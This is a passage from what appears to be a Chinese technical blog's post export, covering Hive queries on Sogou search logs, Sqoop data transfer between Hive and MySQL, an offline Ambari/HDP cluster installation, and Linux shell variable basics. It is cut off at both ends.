sogou_xj || sogou_xj_backup |+------------------+#最后向分区表中导入数据#开启动态分区非严格模式set hive.exec.dynamic.partition.mode=nonstrict;#禁用矢量运行set hive.vectorized.execution.enabled=false;insert overwrite table sogou.sogou_partition partition(year, month, day, hour) select * from sogou.sogou_ext;#查看数据 # 数据分析需求（1）：条数统计 12#查询总数据条数select count(*) from sogou.sogou_ext; 12#查询关键词非空数据select count(*) from sogou.sogou_ext where keyword is not null and keyword != &#x27;&#x27;; 123#无重复总条数（根据ts, uid, keyword, url）select count(*) from (select uid,count(*) from sogou.sogou_ext group by ts,uid,keyword,url having count(*) = 1 ) t;#需要给子表起个名 12#统计独立uid条数select count(distinct(uid)) from sogou.sogou_ext; # 数据分析需求（2）：关键词分析 1234#查询关键词平均长度select avg(a.cnt) from (select size(split(keyword,&#x27; s+&#x27;)) as cnt from sogou.sogou_ext) a;#由于split函数不支持矢量计算，需要先关闭该功能set hive.vectorized.execution.enabled=false; 12#查询频度排名前50select keyword,count(*) as cnt from sogou.sogou_ext group by keyword order by cnt desc limit 50; # 数据分析需求（3）：UID 分析 123#为了统计UID的查询次数分布（查询1次的UID个数…查询n次的UID个数），这里我们列出查询1次、2次、3次和大于3次的UID个数select sum(if(uids.cnt=1,1,0)),sum(if(uids.cnt=2,1,0)), sum(if(uids.cnt=3,1,0)), sum(if(uids.cnt&gt;3,1,0)) from (select uid, count(*) as cnt from sogou.sogou_ext group by uid) uids; 12#统计UID平均查询次数select sum(a.cnt)/count(a.uid)from(select uid,count(*)as cnt from sogou.sogou_ext group by uid) a; 12345678#统计查询次数大于2次的用户占比：#先统计B:UID总数select count(distinct(uid)) as A from sogou.sogou_ext;#统计查询A:次数大于2的UID个数select count(a.uid) as B from (select uid,count(*) as cnt from sogou.sogou_ext group by uid having cnt&gt;2)a;#占比结果是C=B/A#查询次数大于2次的数据如下select b.* from(select uid,count(*) as cnt from sogou.sogou_ext group by uid having cnt &gt;2) a join sogou.sogou_ext b on a.uid=b.uid limit 50; # 数据分析需求（4）：用户行为分析 12345#点击次数与rank之间的关系select count(*) from sogou.sogou_ext where rank &lt; 11;+----------+| 4999869 |+----------+ 12345#直接输入url进行查询的比例select count(*) from sogou.sogou_ext where keyword like&#x27;%www%&#x27;;+--------+| 73979 |+--------+ 12345#用户访问的网站包含用户输入的url类型关键词select sum(if(instr(url，keyword)&gt;0,1,0)) from (select * from sogou.sogou_ext where keyword like &#x27;%www%&#x27;)a;+--------+| 27561 |+--------+ 123456789#查询独立用户行为select uid, count(*)as cnt from sogou.sogou_ext where keyword like&#x27;%仙剑奇侠传%&#x27; group by uid having cnt &gt; 3;+-----------------------------------+------+| uid | cnt |+-----------------------------------+------+| 265f1fa26029c058c695ecc7ee4bad01 | 4 || 2b136abffd8f0dd38d97a52a7e50f7fb | 4 || 40aa046859609c25b3914ac9f2735c5c | 5 || 653d48aa356d5111ac0e59f9fe736429 | 9 | # Sqoop 应用与开发 在实际开发中我们经常会碰到这样一种需求，即大数据平台处理完的数据需要导入关系型数据库，反之关系型数据库中的数据也需要导入大数据平台，为此大数据平台为我们提供了 Sqoop 工具来解决这一需求。 # Sqoop 简介 Sqoop 是 Apache 开源的顶级项目之一，用于在 ApacheHadoop 和关系型数据库等结构化数据存储之间高效传输大容量数据的工具。也就是说，Sqoop 是一款类 ETL 工具，主要负责将大数据平台处理完的数据导入关系型数据库中，或者将关系型数据库中的数据带入大数据平台。 # Sqoop 安装部署 安装环境 在安装 Sqoop 之前确保 hadoop 正确启动，运行，mysql 正常运行。 解压安装 12345tar -zxvf sqoop-1.4.7.bin__hadoop-2.6.0.tar.gzmv sqoop-1.4.7.bin__hadoop-2.6.0 /usr/local/sqoop#更改目录权限chown hadoop:hadoop -R /usr/local/sqoop/ 配置 Sqoop 配置 MySQL 连接器 Sqoop 底层通过 JDBC 的方式访问 MySQL 数据库，所以需要把 MySQL 数据库的驱动程序复制到 Sqoop 的依赖包，这里可以使用 hive 的 mysql 驱动（如果有） 1cp /usr/local/hive/lib/mysql-connector-java-5.1.32.jar /usr/local/sqoop/lib/ 配置环境变量 进入到 Sqoop 的 conf 目录下，找到 sqoop-env-template.sh 文件，重命名为 sqoop-env.sh，打开进行环境变量的配置 12cp /usr/local/sqoop/conf/sqoop-env-template.sh /usr/local/sqoop/conf/sqoop-env.shvi /usr/local/sqoop/conf/sqoop-env.sh 3. 将 commons-log.jar 包放在 lib 下。 https://mirrors.tuna.tsinghua.edu.cn/apache//commons/lang/binaries/commons-lang-2.6-bin.zip 12mv commons-lang-2.6.jar /usr/local/sqoop/lib/chown hadoop:hadoop /usr/local/sqoop/lib/commons-lang-2.6.jar # Sqoop 将 Hive 表中的数据导入 MySQL 实验条件 MySQL 正常启动 构建 MySQL 数据库中的表 登录 MySQL 登录 MySQL 的命令 1mysql -u root -p 创建数据库 12create database if not exists test;Query OK, 1 row affected (0.00 sec) 创建表 1234567891011create table test.uid_cnt (uid varchar(255) default null,cnt int(11) default null);Query OK, 0 rows affected (0.05 sec)desc test.uid_cnt;+-------+--------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+--------------+------+-----+---------+-------+| uid | varchar(255) | YES | | NULL | || cnt | int(11) | YES | | NULL | |+-------+--------------+------+-----+---------+-------+2 rows in set (0.15 sec) 构建 Hive 数据仓库中的表 进入 Hive 创建 Hive 中的表 sogou.sogou_uid_cnt 1create table sogou.sogou_uid_cnt(uid string,cnt int) row format delimited fields terminated by &#x27;\\t&#x27;; 向表中写入数据 12insert into table sogou.sogou_uid_cnt select uid,count(*) from sogou_500w group by uid;select * from sogou.sogou_uid_cnt limit 10; 使用 Sqoop 工具将 Hive 的数据导入 MySQL 导入命令 1/usr/local/sqoop/bin/sqoop export --connect jdbc:mysql://master:3306/test --username root --password 123456 --table uid_cnt --export-dir &#x27;hdfs://master:9000/user/hive/warehouse/sogou.db/sogou_uid_cnt&#x27; --fields-terminated-by &#x27;\\t&#x27; 以上命令的解释如下 sqoop export 表示数据从 Hive 复制到 MySQL 数据库中；–connect jdbc:mysql://master:3306/test 表示连接 MySQL 数据库 test；–username root 表示连接 MySQL 数据库的用户名；–password 12345 表示连接 MySQL 数据库的密码；–table uid_cnt 表示 MySQL 中的表即将被导入的表名称；–export-dir '/user/hive/warehouse/sogou.db/uid_cnt’表示 Hive 中被导出的文件路径；–fields-terminated-by '\\t’表示 Hive 中被导出的文件字段的分隔符。 以上命令成功运行之后会在控制台打印输出如下结果 最后，验证结果数据。 登录 MySQL 数据库，查询库 test 的表 uid_cnt 中是已经有了数据，如果有数据说明 Sqoop 工具将 Hive 中的数据成功导入了 MySQL。 123select * from test.uid_cnt limit 10;select count(*) from test.uid_cnt; 使用 Sqoop 工具将 MySQL 中的数据导入 Hive 表 前面我们成功地将 Hive 表 sogou_uid_cnt 中的数据导入 MySQL 数据库的 uid_cnt 表，反之，我们再利用 Sqoop 工具将表 uid_cnt 中的数据导入表 sogou_uid_cnt2 中 首先，在 Hive 中创建表 sogou_uid_cnt2 12create table sogou.sogou_uid_cnt2(uid string,cnt int) row format delimited fields terminated by &#x27;\\t&#x27;;describe sogou.sogou_uid_cnt2; 然后，我们就可以使用 Sqoop 工具将 MySQL 中表 uid_cnt 的数据导入 Hive 的表 sogou_uid_cnt 在导入数据之前，/user/hive/warehouse/sogou.db/sogou_uid_cnt2 已经存在，我们将其删除。 123hdfs dfs -rmdir /user/hive/warehouse/sogou.db/sogou_uid_cnt2/usr/local/sqoop/bin/sqoop import --connect jdbc:mysql://master:3306/test --username root --password 123456 --table uid_cnt --target-dir /user/hive/warehouse/sogou.db/sogou_uid_cnt2 --fields-terminated-by &#x27;\\t&#x27; -m 1 进入 Hive 进行验证 1select * from sogou.sogou_uid_cnt2 limit 10;","categories":[{"name":"Hive","slug":"Hive","permalink":"http://example.com/categories/Hive/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://example.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"Ambari","slug":"平台/Ambari","date":"2021-09-28T10:39:27.000Z","updated":"2021-10-09T10:06:23.330Z","comments":true,"path":"2021/09/28/平台/Ambari/","link":"","permalink":"http://example.com/2021/09/28/%E5%B9%B3%E5%8F%B0/Ambari/","excerpt":"","text":"# Ambari # 1. 什么是 Ambari Apache Ambari 项目旨在通过开发用于配置，管理和监视 Apache Hadoop 集群的软件来简化 Hadoop 管理。Ambari 通过其 RESTful API 提供了直观，易于使用的 Hadoop 管理 Web UI。 Ambari 使系统管理员可以： 设置 Hadoop 集群 Ambari 提供了用于在任意数量的主机上安装 Hadoop 服务的分步向导。 Ambari 处理群集的 Hadoop 服务的配置。 管理 Hadoop 集群 Ambari 提供了用于在整个集群中启动，停止和重新配置 Hadoop 服务的集中管理。 监控 Hadoop 集群 Ambari 提供了一个仪表板，用于监视 Hadoop 集群的运行状况和状态。 Ambari 利用 Ambari Metrics System 收集指标。 Ambari 利用 Ambari Alert Framework 进行系统警报，并在需要您关注时（例如，节点故障，剩余磁盘空间不足等）通知您。 Ambari 使应用程序开发人员和系统集成商能够： 使用 Ambari REST API 轻松将 Hadoop 的配置，管理和监视功能集成到自己的应用程序中。 官方网站：http://ambari.apache.org/ # 2.Ambari 架构 # ambari-server 提供外部访问的 API 接受 Ambari-agent 的心跳信息和管理 Ambari-agent 元数据的管理和数据库的访问 # ambari-agent 采集所在节点的信息并且汇总发心跳汇报给 ambari-server 处理 ambari-server 的执行请求，安装、启动、停止服务等 # ambari-web 提供可视化的操作界面 # 3. 下载 Ambari 所在的公司已经被 Cloudera 公司收购所以相关的文档都在 clodera 公司的官方网站：https://docs.cloudera.com/HDPDocuments/index.html 我们选择的安装方式是：Ambari+HDP+HDP-UTILS, 因为 Ambari 本身只是一个大数据平台自动化部署和管理的工具，所以需要配合 HDP (大数据软件安装包集合) 一起使用。 选择合适的版本，我们这里选择的是 2.7.0.0 版本，然后就会有一个安装指南：https://docs.cloudera.com/HDPDocuments/Ambari-2.7.0.0/bk_ambari-installation/content/ambari_repositories.html 其实可以直接配置官网提供的 yum 源就可以安装，但是由于是国外的网站，速度比较慢，所以就使用离线本地 yum 源的安装方式 # 4. 安装环境说明 使用 VMWare/VirtualBox，虚拟四台虚拟机，(也可以将 server 配置在一台节点中) 其中 ambari 是服务器，其他为 HDP 安装节点，配置如下: 主机 系统 网络 内存 磁盘 ambari CentOS7 172.18.74.160(NAT/birdge) 4G 50G hdp-1 CentOS7 172.18.74.161(NAT/birdge) 4G 50G hdp-2 CentOS7 172.18.74.162(NAT/birdge) 4G 50G hdp-3 CentOS7 172.18.74.163(NAT/birdge) 4G 50G 配置好虚拟机就可以安装了，安装的方式如下 # 5.Server 端环境配置 (ambari) 说明：如果服务器已经配置好，则直接进行第 6 节客户端的配置。 # 5.1. 安装 http 服务 1234yum install -y httpdsystemctl start httpdsystemctl enable httpd # 5.2. 配置 yum 源 虚拟机的网络模式是 nat 或者桥接的时候就可以连通外网，这样我们就可以不用配置 CentOS 的 yum 源了，但是 Ambari 和 HDP 的还需要我们配置，需要将 Ambari 和 HDP 以及 HDP-UTILS 的安装包通过 SFTP 工具上传到 ambari 上。 1234567#创建文件夹mkdir /var/www/html/&#123;ambari,hdp,hdp-utils&#125;# 解压安装包到HTTP的网页根目录tar -zxvf HDP-UTILS-1.1.0.22-centos7.tar.gz -C /var/www/html/hdp-utils/tar -zxvf ambari-2.7.0.0-centos7.tar.gz -C /var/www/html/tar -zxvf HDP-3.0.0.0-centos7-rpm.tar.gz -C /var/www/html/hdp 这样就可以通过 http 的方式获取到相应的 rpm 文件和 repodata 文件来配置 yum 源了 12345678910111213141516171819# 配置ambari的yum源vi /etc/yum.repos.d/ambari.repo[ambari]name=ambaribaseurl=http://172.18.74.160/centos7/2.7.0.0-897/gpgcheck=0#配置hdp和hdp-utils的yum源vi /etc/yum.repos.d/hdp.repo[HDP]name=HDPbaseurl=http://172.18.74.160/hdp/HDP/centos7/3.0.0.0-1634/gpgcheck=0[HDP-UTILS]name=HDP_UTILSbaseurl=http://172.18.74.160/hdp-utils/HDP-UTILS/centos7/1.1.0.22/gpgcheck=0# 验证yum repolist 将 yum 文件使用 scp 发送到客户端节点 12scp /etc/yum.repos.d/ambari.repo hdp-1:/etc/yum.repos.d/scp /etc/yum.repos.d/hdp.repo hdp-1:/etc/yum.repos.d/ # 5.3. 数据库配置 数据库使用 MariaDB 作为元数据储存的库，存放 ambari 服务数据 123456# 安装yum install -y mariadb-server# 启动 开机自启systemctl start mariadb &amp;&amp; systemctl enable mariadb# 初始化mysql_secure_installation 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061[root@ambari ~]# mysql_secure_installation NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY!In order to log into MariaDB to secure it, we&#x27;ll need the currentpassword for the root user. If you&#x27;ve just installed MariaDB, andyou haven&#x27;t set the root password yet, the password will be blank,so you should just press enter here.Enter current password for root (enter for none): OK, successfully used password, moving on...Setting the root password ensures that nobody can log into the MariaDBroot user without the proper authorisation.Set root password? [Y/n] New password: Re-enter new password: Password updated successfully!Reloading privilege tables.. ... Success!By default, a MariaDB installation has an anonymous user, allowing anyoneto log into MariaDB without having to have a user account created forthem. This is intended only for testing, and to make the installationgo a bit smoother. You should remove them before moving into aproduction environment.Remove anonymous users? [Y/n] ... Success!Normally, root should only be allowed to connect from &#x27;localhost&#x27;. Thisensures that someone cannot guess at the root password from the network.Disallow root login remotely? [Y/n] n ... skipping.By default, MariaDB comes with a database named &#x27;test&#x27; that anyone canaccess. This is also intended only for testing, and should be removedbefore moving into a production environment.Remove test database and access to it? [Y/n] - Dropping test database... ... Success! - Removing privileges on test database... ... Success!Reloading the privilege tables will ensure that all changes made so farwill take effect immediately.Reload privilege tables now? [Y/n] ... Success!Cleaning up...All done! If you&#x27;ve completed all of the above steps, your MariaDBinstallation should now be secure.Thanks for using MariaDB! # 5.3.1. 创建数据库 123456789mysql -uroot -p# 创建amabri数据库create database ambari;#授权grant all on ambari.* to ambari@&#x27;%&#x27; identified by &#x27;bigdata&#x27;;grant all on ambari.* to ambari@localhost identified by &#x27;bigdata&#x27;;# 使用ambari-server提供的sql脚本创建相关的表use ambari;source /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql # 5.3.2. 将 JDBC 驱动包复制到指定目录（/usr/share/java） 将 jdbc 的驱动包使用 sftp 工具上传到 ambari 12mv mysql-connector-java-*.jar /usr/share/java/mysql-connector-java.jarambari-server setup --jdbc-db=mysql --jdbc-driver=/usr/share/java/mysql-connector-java.jar # 5.4. 安装 ambari-server 12345# 安装yum install -y ambari-server# 配置ambari-serverambari-server setup 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758[root@hdp-1 ~]# ambari-server setupUsing python /usr/bin/pythonSetup ambari-serverChecking SELinux...SELinux status is &#x27;enabled&#x27;SELinux mode is &#x27;permissive&#x27;WARNING: SELinux is set to &#x27;permissive&#x27; mode and temporarily disabled.OK to continue [y/n] (y)? yCustomize user account for ambari-server daemon [y/n] (n)? yEnter user account for ambari-server daemon (root):Adjusting ambari-server permissions and ownership...Checking firewall status...Checking JDK...[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8[2] Custom JDK==============================================================================Enter choice (1): 2WARNING: JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts.WARNING: JCE Policy files are required for configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts.Path to JAVA_HOME: /opt/jdk1.8.0_171/Validating JDK on Ambari Server...done.Check JDK version for Ambari Server...JDK version found: 8Minimum JDK version is 8 for Ambari. Skipping to setup different JDK for Ambari Server.Checking GPL software agreement...GPL License for LZO: https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.htmlEnable Ambari Server to download and install GPL Licensed LZO packages [y/n] (n)? Completing setup...Configuring database...Enter advanced database configuration [y/n] (n)? yConfiguring database...==============================================================================Choose one of the following options:[1] - PostgreSQL (Embedded)[2] - Oracle[3] - MySQL / MariaDB[4] - PostgreSQL[5] - Microsoft SQL Server (Tech Preview)[6] - SQL Anywhere[7] - BDB==============================================================================Enter choice (1): 3Hostname (localhost): Port (3306): Database name (ambari): Username (ambari): Enter Database Password (bigdata): Configuring ambari database...Should ambari use existing default jdbc /usr/share/java/mysql-connector-java.jar [y/n] (y)? Configuring remote database connection properties...WARNING: Before starting Ambari Server, you must run the following DDL against the database to create the schema: /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sqlProceed with configuring remote database connection properties [y/n] (y)? Extracting system views...ambari-admin-2.7.0.0.897.jar....Ambari repo file doesn&#x27;t contain latest json url, skipping repoinfos modificationAdjusting ambari-server permissions and ownership...Ambari Server &#x27;setup&#x27; completed successfully. # 5.5 启动 ambari-server 1ambari-server start 可以访问 ambari 的 web 界面: http://172.18.74.160:8080 # 6.Client 端环境配置 说明：以下配置是在需要安装集群的各个节点中进行，此处为 hdp-1,hdp-2,hdp-3。 # 6.1 修改主机名和配置主机到 IP 的映射 (所有节点) 12345678910111213# 分别修改三台机器的主机名hostnamectl set-hostname hdp-1hostnamectl set-hostname hdp-2hostnamectl set-hostname hdp-3#立即生效bash# 配置主机名到IP的映射vi /etc/hosts172.18.74.160 ambari172.18.74.161 hdp-1172.18.74.162 hdp-2172.18.74.163 hdp-3 # 6.2 关闭防火墙和关闭 SELinux (所有节点) 123456# 关闭防火墙systemctl stop firewalld &amp;&amp; systemctl disable firewalld# 关闭selinuxsetenforce 0vi /etc/selinux/configSELINUX=disabled # 6.3. 配置免密登录 (所有节点) 123456789101112131415# hpd-1ssh-keygenssh-copy-id hdp-1ssh-copy-id hdp-2ssh-copy-id hdp-3# hdp-2ssh-keygenssh-copy-id hdp-1ssh-copy-id hdp-2ssh-copy-id hdp-3# hdp-3ssh-keygenssh-copy-id hdp-1ssh-copy-id hdp-2ssh-copy-id hdp-3 # 6.4. 安装时间同步服务 ntp 12345678910111213#hdp-1yum install -y ntpvi /etc/ntp.confserver 127.127.1.0fudge 127.127.1.0 stratum 10systemctl start ntpdsystemctl enable ntpd#hdp-2yum install -y ntpdatentpdate hdp-1#hdp-3yum install -y ntpdatentpdate hdp-1 # 6.5 关闭大页面压缩 (所有节点) 12echo never &gt; /sys/kernel/mm/transparent_hugepage/enabledecho never &gt; /sys/kernel/mm/transparent_hugepage/defrag # 6.6. 安装配置 JDK 将 jdk 的安装包上传到 hdp-1 12345678910111213141516171819#解压tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/# 配置环境变量vi /etc/profileexport JAVA_HOME=/usr/local/jdkexport JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH# 刷新环境变量source /ect/profilejava# 将jdk和环境变量发送到其它机器scp -r /usr/local/jdk hdp-2:/usr/local/scp -r /usr/local/jdk hdp-3:/usr/local/scp /etc/profile hdp-2:/etc/scp /etc/profile hdp-3:/etc/# hdp-2 hdp-3source /ect/profilejava # 6.7. 安装必要软件 (所有节点) 123456789yum -y install libtirpc-develyum -y install psmiscyum -y install redhat-lsbyum -y install ncyum -y install gccyum -y install python-develyum -y install python-kerberos-1.1-15.el7.x86_64yum -y install rpcbind-0.2.0-49.el7.x86_64 # 6.8. 安装 MySQL 数据库 (hdp-2，安装 Hive 可选) 12345678# 安装yum install -y mariadb-server# 启动 开机自启systemctl start mariadb &amp;&amp; systemctl enable mariadb# 初始化mysql_secure_installation# 进入数据库mysql -u root -p 1234create database hive;create user &quot;hive&quot;@&quot;%&quot; identified by &quot;hive&quot;;grant all privileges on hive.* to &#x27;hive&#x27;@&#x27;%&#x27; identified by &#x27;hive&#x27;;flush privileges; # 6.9. 安装和配置 ambari-agent (所有节点) 12345678# 安装yum install -y ambari-agent# 配置vi /etc/ambari-agent/conf/ambari-agent.ini [server]hostname=ambari#启动ambari-agent start # 7.HDP 部署 # 7.1 登录 在浏览器中访问 http://172.18.74.160:8080 默认的用户名和密码都是 admin # 7.2 配置集群","categories":[],"tags":[]},{"title":"Linux Shell基础","slug":"Linux Shell/Linux Shell基础","date":"2021-09-14T00:19:12.000Z","updated":"2021-12-06T06:03:20.155Z","comments":true,"path":"2021/09/14/Linux Shell/Linux Shell基础/","link":"","permalink":"http://example.com/2021/09/14/Linux%20Shell/Linux%20Shell%E5%9F%BA%E7%A1%80/","excerpt":"","text":"# 1 Shell 基础 什么是 shell？目前常用的操作系统（Windows、U/L、Android、iOS 等）都带有图形界面，然 而，早期的计算机并没有图形界面，人们只能使用命令来控制计算机。其实，真 正能够控制计算机硬件（CPU、内存、显示器）的只有操作系统内核（Kernel）， 图形界面和命令行都是架设在用户和内核之间的桥梁，是为了方便用户控制计算 机而存在的。Shell 也是一种编程语言，主要用来开发一些实用的、自动化的小工具，例如，检测计算机的硬件参数、搭建 Web 运行环境、日志分析等。对 Linux 运维工程师来说，Shell 更是必须掌握的技能。Shell 使自动化管理服务器集群成为可能，否则用户只能一个一个地登录所有的服务器，对每一台服务器进行相同的设置，而这些服务器可能有成百上千之多，用户会在重复性的工作上浪费大量时间。 # 1.1 查看 Shell 版本 1234567cat /ect/shells/bin/sh/bin/bash/sbin/nologin/usr/bin/sh/usr/bin/bash/usr/sbin/nologin # 1.2 Shell 变量类型 Shell 变量分为四类，分别为自定义变量、环境变量、位置变量和预定义变量。 根据工作要求临时定义的变量称为自定义变量 环境变量一般是指用 export 内置命令导出的变量，用于定义 Shell 的运行环境，保证 Shell 命令的正确执行 只使用 不定义 从命令行、函数或脚本执行等处传递参数时，$0、$1 称为特殊位置变量 预定义变量是在 bash 中已有的变量，可以直接使用，如@、@、@、* 等。 # 1.2.1 自定义变量 自定义变量可以理解为局部变量或普通变量，只能在创建它们的 Shell 函数或 Shell 脚本中使用，自定义变量的说明如表所示。 定义自定义变量 变量名 = 变量值，字母下划线开头，区分大小写 使用自定义变量 $ 变量名 查看自定义变量 echo$ 变量名 set (所有变量) 取消自定义变量 unset 变量名 自定义变量使用范围 仅在当前 Shell 中有效 123456789#!/bin/bash#分支结构host=www.baidu.comif ping -c1 $host &amp;&gt;/dev/nullthen echo &quot;network ok&quot;else echo &quot;bad network&quot;fi # 1.2.2 环境变量 环境变量也可称为全局变量，可以在创建它们的 Shell 及其派生出来的任意子进程 Shell 中使用。环境变量的说明如表所示。 12345#查看echo $PATH#修改PATH=$PATH:/bin/newexport PATH # 1.2.3 位置变量 在 Shell 中存在一些位置变量。位置变量用于在命令行、函数或脚本中传递参数，其变量名不用自己定义，其作用也是固定的。执行脚本时，通过在脚本后面给出具体的参数（多个参数用空格隔开）对相应的位置变量进行赋值。 $0 代表命令本身，$1-$9 代表接收的第 1~9 个参数，10以上需要用括起来，如10以上需要用{}括起来，如10以上需要用括起来，如 {10} 代表接收的第 10 个参数。 1234567891011[hadoop@master shell]$ cat ping06.sh #!/bin/bashping -c1 $1 &amp;&gt;/dev/nullif [ $? -eq &quot;0&quot; ];then echo &quot;network to $1 is ok&quot;else echo &quot;bad network to $1&quot;fi[hadoop@master shell]$ sh ping06.sh www.baidu.comnetwork to www.baidu.com is ok # 1.2.4 预定义变量 $0 脚本名 $* 所有参数 $@ 所有参数 $# 参数的个数 $$ 当前进程 PID $! 上一个进程 PID $? 上一个命令返回值，0 代表成功 123456789101112131415161718192021222324252627[hadoop@master shell]$ ls &amp;[1] 6950[hadoop@master shell]$ ip.txt ping03.sh ping04.sh ping05.sh ping06.sh ping07.sh read[1]+ 完成 ls --color=auto[hadoop@master shell]$ $!-bash: 6950: 未找到命令[hadoop@master shell]$ cat ping07.sh #!/bin/bashif [ $# -eq 0 ];then echo &quot;usage: `basename $0` filename&quot; exitfiif [ ! -f $1 ];then echo &quot;filename error&quot; exitfifor ip in `cat $1`do ping -c1 $ipdone[hadoop@master shell]$ sh ping07.sh usage: ping07.sh filename[hadoop@master shell]$ sh ping07.sh ip.txt # 1.3 变量的赋值 # 1.3.1 显式赋值 在 Shell 中，当第一次使用某变量名时，实际上就已经给变量赋值了。显式赋值的 格式为” 变量名 = 变量值”。为了避免歧义，显式赋值时__禁止在等号两边添加空格__， 这跟常见的编程语言有所不同。 1a=3 变量缺省为字符串类型 变量值中有空格需要使用引号 使用变量值进行赋值 name=“welcome to $place” # 1.3.2 从键盘赋值 1234read -p &quot;Please enter a ip:&quot; ipPlease enter a ip:1.1.1.1echo $ip1.1.1.1 # 1.3.3 使用位置变量赋值 1234cat test.shecho $1 $2sh test.sh hello worldhello world # 1.3.4 利用命令替换进行赋值 1234today=`date +%F`echo today2021-10-2touch `date +%F`_file.txt 双引号弱引用，单引号为强引用 12345678910[hadoop@master shell]$ cat ping04.sh #!/bin/bashhost=www.baidu.comping -c1 $host &amp;&gt;/dev/nullif [ $? -eq 0 ] then echo &quot;network to $host is ok&quot;else echo &quot;bad network to $host&quot;fi # 1.4 变量的运算 # 1.4.1.expr 数值运算命令 123456echo 1 + 31 + 3expr 1 + 34res = `expr $name1 \\* $name2`echo $res 在使用 expr 时，需要注意运算符及用于计算的数字两边必须有空格，否则会执行失败。 expr 支持乘法运算，在使用乘号 * 时必须用反斜杠转义，即 \\* # 1.4.2.“$(())” 或 “[]” 数值运算命令 双小括号 “$(())” 的作用是进行整数运算和数值比较，格式为 “ ((表达式))” 操作数、运算符两侧可以有空格 括号内 $ 符合可省略 12345678num1=10num2=20sum=$((num1+num2))echo $sum30sum=$[ num1+num2 ]echo $sum#可以使用加减乘除幂 # 1.4.3.let 数值运算命令 let 数值符号可以直接进行计算，不需要使用 $ 符号。 let 运算命令的语法格式为：let 赋值表达式 12345let num=1+2echo $num3#调试模式bash -vx test.sh # 1.4.4Shell 小数运算 bc 是 Unix/Linux 下的计算器，它还可以作为命令进行小数运算。 1234echo &quot;2^4&quot;|bc16echo &quot;scale=2;6/4&quot;|bc1.50 # 1.5 变量的删除和替换 Linux 提供了一些可以直接对变量进行操作的符号。通过这些符号，变量中的部分内容可以被删除、替换和替代。在 Shell 变量中，变量的删除、替换和替代也是非常重要的。通过简单的操作修改变量，可以减少代码的行数并提高可读性。 # 1.5.1 变量的删除 变量删除的操作方式，如表所示。 操作 描述 $ 如果变量内容从头开始的数据符合 “关键字符”，则将符合的最短数据删除 $ 如果变量内容从头开始的数据符合 “关键字符”，则将符合的最长数据删除 $ 如果变量内容从尾开始的数据符合 “关键字符”，则将符合的最短数据删除 $ 如果变量内容从尾开始的数据符合 “关键字符”，则将符合的最长数据删除 1234567891011121314[root@hdp-1 ~]# url=www.bing.com[root@hdp-1 ~]# echo $&#123;url&#125;www.bing.com[root@hdp-1 ~]# echo $&#123;#url&#125;12[root@hdp-1 ~]# echo $&#123;url&#125;www.bing.com[root@hdp-1 ~]# echo $&#123;url#*.&#125;bing.com[root@hdp-1 ~]# echo $&#123;url##*.&#125;com[root@hdp-1 ~]# echo $&#123;url%.*&#125;www.bing[root@hdp-1 ~]# echo $&#123;url%%.*&#125; 索引和切片 12345678[root@hdp-1 ~]# echo $&#123;url:0:5&#125;www.b[root@hdp-1 ~]# echo $&#123;url:5:5&#125;ing.c[root@hdp-1 ~]# echo $&#123;url:5:&#125;[root@hdp-1 ~]# echo $&#123;url:5&#125;ing.com # 1.5.2 变量的替换 操作 描述 $ 表示若变量内容符和【旧字符串】则第一个【旧字符串】会被【新字符串】替换 $ 表示若变量内容符和【旧字符串】则全部的【旧字符串】会被【新字符串】替换 12345678[root@hdp-1 ~]# echo $&#123;url/bing/baidu&#125;www.baidu.com[root@hdp-1 ~]# echo $&#123;url/b/B&#125;www.Bing.com[root@hdp-1 ~]# echo $&#123;url/w/W&#125;Www.bing.com[root@hdp-1 ~]# echo $&#123;url//w/W&#125;WWW.bing.com # 1.5.3 变量的替代 给 Shell 变量设置默认值的格式为”${变量名 - 新的变量名}”，如果变量名没有被赋值，会使用” 新的变量值” 替代，如果变量已被赋值（包括空值），则该值不会被替代。 变量替代常用于为变量设置缺省值。例如，在连接数据库时，需要使用端口，这个端口可以是预先设置的具体端口，也可以是用户输入的端口。假如用户没有输入具体的端口号，脚本中就使用预先设置的端口。 1234567891011121314151617181920212223[root@hdp-1 ~]# unset url[root@hdp-1 ~]# echo $&#123;url&#125;[root@hdp-1 ~]# echo $&#123;url-www.heuet.edu.cn&#125;www.heuet.edu.cn[root@hdp-1 ~]# host=hadoop[root@hdp-1 ~]# echo $&#123;host-www.heuet.edu.cn&#125;hadoop[root@hdp-1 ~]# var=[root@hdp-1 ~]# echo $&#123;var-www.heuet.edu.cn&#125;[root@hdp-1 ~]# unset var1[root@hdp-1 ~]# var2=[root@hdp-1 ~]# var3=333[root@hdp-1 ~]# echo $&#123;var1-111&#125;111[root@hdp-1 ~]# echo $&#123;var1:-111&#125;111[root@hdp-1 ~]# echo $&#123;var2:-111&#125;111[root@hdp-1 ~]# echo $&#123;var3:-111&#125;333","categories":[{"name":"平台","slug":"平台","permalink":"http://example.com/categories/%E5%B9%B3%E5%8F%B0/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"http://example.com/tags/Shell/"}]},{"title":"Linux Shell循环结构","slug":"Linux Shell/Linux Shell循环结构","date":"2021-09-14T00:19:12.000Z","updated":"2021-12-06T07:51:08.409Z","comments":true,"path":"2021/09/14/Linux Shell/Linux Shell循环结构/","link":"","permalink":"http://example.com/2021/09/14/Linux%20Shell/Linux%20Shell%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/","excerpt":"","text":"# 3 循环结构 Shell 语言支持四种循环语句：for、while、until、select 工作中常用的是 for、while、until # for 循环语法结构 for 